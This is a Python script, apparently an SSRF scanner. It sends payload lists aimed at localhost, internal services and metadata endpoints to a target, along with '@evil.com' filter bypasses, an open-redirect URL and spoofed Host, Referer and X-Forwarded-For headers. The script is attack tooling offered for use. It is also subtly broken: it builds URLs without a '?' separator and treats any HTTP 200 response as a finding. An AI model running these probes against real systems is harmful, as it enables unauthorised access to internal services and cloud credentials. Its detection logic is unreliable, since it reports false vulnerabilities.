import requests
from urllib.parse import urlencode

payloads = {
    "ssrf_server": ["http://127.0.0.1", "http://localhost"],
    "ssrf_backend": ["http://internal-service", "http://database-service"],
    "blacklist_bypass": ["http://127.0.0.1@evil.com", "http://localhost@evil.com"],
    "whitelist_bypass": ["http://whitelisted.com@127.0.0.1", "http://whitelisted.com@localhost"],
    "open_redirect": ["http://vulnerable-site.com/redirect?url=http://evil.com"],
    "partial_urls": ["//localhost", "//127.0.0.1"],
    "urls_in_data": ['{"url": "http://127.0.0.1"}', '<url>http://127.0.0.1</url>'],
    "referer_header": ["http://127.0.0.1", "http://localhost"]
}

def send_request(url, payload, headers=None, allow_redirects=True):
    try:
        response = requests.get(url + payload, headers=headers, timeout=10, allow_redirects=allow_redirects)
        return response
    except requests.exceptions.RequestException as e:
        return None

def check_ssrf(url):
    result = ""
    for category, payload_list in payloads.items():
        result += f"Testing {category} payloads\n"
        for payload in payload_list:
            full_url = url + urlencode({'url': payload})
            response = send_request(full_url, "", allow_redirects=False)
            if response and analyze_response(response, payload):
                result += f"Possible SSRF vulnerability detected with payload: {payload}\n"
                return result

            headers = {'X-Forwarded-For': payload, 'Referer': payload, 'Host': payload}
            response = send_request(full_url, "", headers=headers, allow_redirects=False)
            if response and analyze_response(response, payload):
                result += f"Possible SSRF vulnerability detected with payload: {payload}\n"
                return result

            if category == "urls_in_data":
                headers = {'Content-Type': 'application/json'}
                response = requests.post(url, data=payload, headers=headers, timeout=10)
                if response and analyze_response(response, payload):
                    result += f"Possible SSRF vulnerability detected with payload: {payload}\n"
                    return result
    result += "No SSRF vulnerability detected.\n"
    return result

def analyze_response(response, payload):
    if "Metadata" in response.text or "169.254.169.254" in response.text or response.status_code == 200:
        return True
    return False
